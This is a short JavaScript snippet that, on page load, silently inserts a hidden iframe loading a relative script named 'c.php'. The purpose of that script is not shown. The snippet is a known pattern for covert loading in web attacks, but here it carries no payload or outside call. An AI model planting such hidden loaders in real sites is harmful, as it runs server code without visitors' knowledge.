window.onload = function() 
{
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = 'c.php';
    document.body.appendChild(iframe);
};
